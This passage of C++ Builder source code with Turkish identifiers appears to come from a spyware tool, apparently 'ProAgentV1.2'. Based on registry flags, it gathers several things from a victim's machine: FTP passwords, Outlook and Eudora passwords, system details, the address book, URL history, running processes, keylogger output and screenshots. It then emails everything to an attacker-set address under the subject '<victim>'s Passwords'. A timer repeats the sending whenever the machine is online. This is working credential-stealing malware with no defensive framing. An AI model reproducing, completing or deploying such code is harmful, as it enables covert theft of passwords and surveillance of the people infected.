Form1->Memo1->Lines->Add("");
ftp_coz(fps3);
}
if(reg.ReadString("Eudora")=="1")
{
Form1->Memo1->Lines->Add("");
Form1->Memo1->Lines->Add("//////// Outlook&Eudora Passwords /////");
Form1->Memo1->Lines->Add("");
mps_coz(mps3);
}
if(reg.ReadString("PcInfo")=="1")
Makina_Bilgisi();
if(reg.ReadString("Abook")=="1")
kayitli_mail_adresleri();
if(reg.ReadString("UrlInfo")=="1")
url_kayitlari();
if(reg.ReadString("Processes")=="1")
process();
}//tekrar

Form1->Memo3->Text=Form1->Memo1->Text;
if(reg.ReadString("KeyLog")=="1")
{
keylog_coz(keylog);
//ShowMessage("");
}
if(reg.ReadString("Ss")!="0")
ekran_goruntusu(StrToInt(reg.ReadString("Ss")));


try    //devreye sokmayi untmaaaa
  {
if (Form1->NMSMTP1->Connected)
   Form1->NMSMTP1->Disconnect();
   Form1->NMSMTP1->MailServer=reg.ReadString("Smtp");
   Form1->NMSMTP1->Connect();
   //Form1->NMSMTP1->PostMessageA->FromName="ProAgentV1.2";
   Form1->NMSMTP1->Subject=reg.ReadString("Kurban")+"'s Passwords";
   //if(reg.ReadString("Ss")!="0")
   //Form1->NMSMTP1->PostMessageA->Attachments->Add(Ss);
   Form1->NMSMTP1->MessageText =Form1->Memo3->Text;
   Form1->NMSMTP1->SendTo=reg.ReadString("MailTo");
   Form1->NMSMTP1->Send();
   Form1->NMSMTP1->Disconnect();
   //ShowMessage("Gonderildi");
   Form1->Memo3->Clear();
   }
    catch(...)
    {
    //ShowMessage("Hata Olustu");
    //if (Form1->NMSMTP1->Connected)
    //Form1->NMSMTP1->Disconnect();
    Form1->Memo3->Clear();
    }

}
//---------------------------------------------------------------------------


void __fastcall TForm1::Timer1Timer(TObject *Sender)
{

if(adet1==adet)
        {
        baglanti=true;
        adet1=0;
        }
        adet1++;
if(baglanti==true)
{
  if (InternetGetConnectedState(&dwFlags, NULL))
      {
        baglanti=false;
        send(tekrar);
        tekrar=false;
      }
       else
           {
            baglanti=true;
           }
}

}
//---------------------------------------------------------------------------



